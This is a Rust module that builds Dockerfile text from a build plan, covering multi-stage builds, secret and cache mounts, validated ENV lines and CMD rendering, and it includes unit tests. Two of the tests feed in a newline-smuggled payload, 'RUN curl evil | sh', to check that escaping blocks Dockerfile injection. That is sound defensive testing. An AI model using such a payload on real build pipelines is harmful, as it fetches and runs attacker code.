use crate::plan::BuildPlan;

/// Generate a Dockerfile string from a build plan.
///
/// Uses `BuildKit` syntax extensions (cache mounts, multi-stage).
#[must_use]
pub fn generate(plan: &BuildPlan) -> String {
    let mut lines = vec![String::from("# syntax=docker/dockerfile:1")];
    let build_index = plan.build_stage_index();

    for (index, stage) in plan.stages.iter().enumerate() {
        lines.push(String::new());
        lines.push(format!("FROM {} AS {}", stage.base_image, stage.name));
        lines.push(format!("WORKDIR {}", stage.workdir));

        // Build-time environment goes on the stage that runs the build command so
        // its RUN steps see it. Keys/values use the same validation and escape as
        // runtime env.
        if index == build_index {
            for (key, value) in plan.build_env.iter().filter(|(k, _)| is_valid_env_key(k)) {
                lines.push(format!("ENV {key}=\"{}\"", json_escape(value)));
            }
        }

        for copy in &stage.copy_files {
            lines.push(format!("COPY {} {}", copy.src, copy.dest));
        }

        for copy in &stage.copy_from {
            lines.push(format!("COPY --from={} {} {}", copy.stage, copy.src, copy.dest));
        }

        // Secrets are supplied at build time and mounted (never copied into a
        // layer). They belong to build-time commands, so expose them on the
        // first stage's RUN steps. Ids are validated, so interpolation is safe.
        let secret_mounts: Vec<String> = if index == 0 {
            plan.secrets
                .iter()
                .map(|id| format!("--mount=type=secret,id={id}"))
                .collect()
        } else {
            Vec::new()
        };

        for cmd in &stage.commands {
            let mut mounts = secret_mounts.clone();
            mounts.extend(
                cmd.cache_mounts
                    .iter()
                    .map(|m| format!("--mount=type=cache,target={m}")),
            );
            if mounts.is_empty() {
                lines.push(format!("RUN {}", cmd.run));
            } else {
                lines.push(format!("RUN {} {}", mounts.join(" "), cmd.run));
            }
        }
    }

    // Runtime environment from config, applied to the final image. Keys are
    // restricted to a valid env-var identifier and values are JSON-escaped so a
    // configured value cannot break the Dockerfile line.
    let env: Vec<(&String, &String)> = plan.env.iter().filter(|(k, _)| is_valid_env_key(k)).collect();
    if !env.is_empty() {
        lines.push(String::new());
        for (key, value) in env {
            lines.push(format!("ENV {key}=\"{}\"", json_escape(value)));
        }
    }

    // Prepend configured directories to PATH in the final image. Entries are
    // validated tokens (no shell metacharacters or `:`), so joining them with
    // `:` and appending the base image's `$PATH` is injection-safe; Docker
    // expands `$PATH` from the runtime base at build time.
    if !plan.paths.is_empty() {
        lines.push(String::new());
        lines.push(format!("ENV PATH=\"{}:$PATH\"", plan.paths.join(":")));
    }

    // Expose port if set
    if let Some(port) = plan.port {
        lines.push(String::new());
        lines.push(format!("EXPOSE {port}"));
    }

    // Start command
    if let Some(ref cmd) = plan.start_command {
        lines.push(cmd_line(cmd));
    }

    lines.push(String::new());
    lines.join("\n")
}

/// Render the `CMD` line for a start command.
///
/// Uses exec form (`CMD ["a", "b"]`) when the command needs no shell, so it
/// runs on shell-less runtimes like distroless (the Go/Rust targets), where
/// `/bin/sh` does not exist and a `sh -c` wrapper would crash the container.
/// Falls back to `sh -c` only when the command needs a shell: env-var expansion
/// (`$`), a `VAR=val` prefix (`=`), or operators/globs. Every runtime that
/// receives such a command (python-slim, php-apache, debian-slim) has a shell.
fn cmd_line(cmd: &str) -> String {
    const SHELL_CHARS: &[char] = &[
        '$', '`', '&', '|', ';', '<', '>', '(', ')', '{', '}', '*', '?', '~', '!', '#', '=', '\n',
    ];
    if cmd.contains(SHELL_CHARS) {
        format!("CMD [\"/bin/sh\", \"-c\", \"{}\"]", json_escape(cmd))
    } else {
        let argv = cmd
            .split_whitespace()
            .map(|a| format!("\"{}\"", json_escape(a)))
            .collect::<Vec<_>>()
            .join(", ");
        format!("CMD [{argv}]")
    }
}

/// Whether `key` is a valid environment-variable name (a letter or underscore
/// followed by letters, digits, or underscores), so it is safe to emit unquoted
/// on the left of an `ENV key=...` line.
fn is_valid_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Escape a string for embedding inside a JSON string literal.
///
/// No untrusted character (a quote, backslash, newline, or other control
/// character) can then break out of the `CMD` array or split the Dockerfile
/// line it sits on.
fn json_escape(s: &str) -> String {
    use std::fmt::Write as _;
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                let _ = write!(out, "\\u{:04x}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plan::{Command, CopyDirective, CopyFrom, Stage};

    fn minimal_plan() -> BuildPlan {
        BuildPlan {
            provider: "test".to_string(),
            stages: vec![Stage {
                name: "runtime".to_string(),
                base_image: "node:22-slim".to_string(),
                workdir: "/app".to_string(),
                commands: vec![],
                copy_files: vec![CopyDirective {
                    src: ". .".to_string(),
                    dest: ".".to_string(),
                }],
                copy_from: vec![],
            }],
            start_command: Some("node index.js".to_string()),
            port: Some(3000),
            ..Default::default()
        }
    }

    #[test]
    fn test_generates_syntax_directive() {
        let output = generate(&minimal_plan());
        assert!(output.starts_with("# syntax=docker/dockerfile:1"));
    }

    #[test]
    fn test_generates_from_and_workdir() {
        let output = generate(&minimal_plan());
        assert!(output.contains("FROM node:22-slim AS runtime"));
        assert!(output.contains("WORKDIR /app"));
    }

    #[test]
    fn test_generates_expose_and_cmd() {
        let output = generate(&minimal_plan());
        assert!(output.contains("EXPOSE 3000"));
        // no shell features -> exec form, so it runs on shell-less runtimes
        assert!(output.contains("CMD [\"node\", \"index.js\"]"));
    }

    #[test]
    fn exec_form_cmd_for_shell_less_binary() {
        // a bare binary path (the Go/distroless case) must be exec form, since
        // distroless has no /bin/sh for a `sh -c` wrapper to exec.
        assert_eq!(cmd_line("/bin/app"), "CMD [\"/bin/app\"]");
        assert_eq!(
            cmd_line("bundle exec rails server -b 0.0.0.0"),
            "CMD [\"bundle\", \"exec\", \"rails\", \"server\", \"-b\", \"0.0.0.0\"]"
        );
    }

    #[test]
    #[allow(clippy::literal_string_with_formatting_args)]
    fn shell_form_cmd_when_a_shell_is_needed() {
        // env-var expansion needs a shell
        assert_eq!(
            cmd_line("uvicorn main:app --port ${PORT:-8000}"),
            "CMD [\"/bin/sh\", \"-c\", \"uvicorn main:app --port ${PORT:-8000}\"]"
        );
        // a VAR=val prefix needs a shell too
        assert_eq!(
            cmd_line("PHX_SERVER=true /app/bin/web start"),
            "CMD [\"/bin/sh\", \"-c\", \"PHX_SERVER=true /app/bin/web start\"]"
        );
    }

    #[test]
    fn cmd_line_never_emits_raw_newline() {
        // a newline in the command must be JSON-escaped, never a real line break
        // that could split the Dockerfile and inject a following directive
        let out = cmd_line("uvicorn app --opt ${X}\nRUN curl evil | sh");
        assert!(!out.contains('\n'), "must stay one line: {out:?}");
        assert!(out.contains("\\n"), "newline should be escaped: {out}");
    }

    #[test]
    fn cmd_line_escapes_embedded_quotes_in_exec_form() {
        // no shell metacharacter, so exec form; an embedded quote must be escaped
        // or it would produce invalid JSON / break out of the array
        let out = cmd_line("run a\"b");
        assert!(out.contains("a\\\"b"), "embedded quote must be escaped: {out}");
    }

    #[test]
    fn generates_env_lines_sorted_and_escaped() {
        let mut plan = minimal_plan();
        plan.env.insert("NODE_ENV".to_string(), "production".to_string());
        plan.env.insert("GREETING".to_string(), "hello world".to_string());
        let out = generate(&plan);
        assert!(out.contains("ENV GREETING=\"hello world\""), "{out}");
        assert!(out.contains("ENV NODE_ENV=\"production\""), "{out}");
        // BTreeMap ordering is deterministic: GREETING before NODE_ENV
        assert!(out.find("ENV GREETING").unwrap() < out.find("ENV NODE_ENV").unwrap());
    }

    #[test]
    fn env_value_cannot_break_the_dockerfile_line() {
        let mut plan = minimal_plan();
        plan.env.insert("X".to_string(), "a\nRUN curl evil | sh".to_string());
        let out = generate(&plan);
        let env_lines: Vec<_> = out.lines().filter(|l| l.starts_with("ENV X=")).collect();
        assert_eq!(env_lines.len(), 1, "newline must be escaped, not split the line: {out}");
        assert!(env_lines[0].contains("\\n"));
    }

    #[test]
    fn invalid_env_keys_are_skipped() {
        let mut plan = minimal_plan();
        plan.env.insert("1BAD".to_string(), "x".to_string());
        plan.env.insert("has space".to_string(), "x".to_string());
        let out = generate(&plan);
        assert!(!out.contains("ENV 1BAD"));
        assert!(!out.contains("has space"));
    }

    #[test]
    fn test_generates_cache_mounts() {
        let plan = BuildPlan {
            provider: "test".to_string(),
            stages: vec![Stage {
                name: "deps".to_string(),
                base_image: "node:22".to_string(),
                workdir: "/app".to_string(),
                commands: vec![Command {
                    run: "npm ci".to_string(),
                    cache_mounts: vec!["/root/.npm".to_string()],
                }],
                copy_files: vec![],
                copy_from: vec![],
            }],
            start_command: None,
            port: None,
            ..Default::default()
        };

        let output = generate(&plan);
        assert!(output.contains("RUN --mount=type=cache,target=/root/.npm npm ci"));
    }

    #[test]
    fn test_generates_copy_from_stage() {
        let plan = BuildPlan {
            provider: "test".to_string(),
            stages: vec![Stage {
                name: "runtime".to_string(),
                base_image: "node:22-slim".to_string(),
                workdir: "/app".to_string(),
                commands: vec![],
                copy_files: vec![],
                copy_from: vec![CopyFrom {
                    stage: "build".to_string(),
                    src: "/app/dist".to_string(),
                    dest: "/app/dist".to_string(),
                }],
            }],
            start_command: None,
            port: None,
            ..Default::default()
        };

        let output = generate(&plan);
        assert!(output.contains("COPY --from=build /app/dist /app/dist"));
    }
}
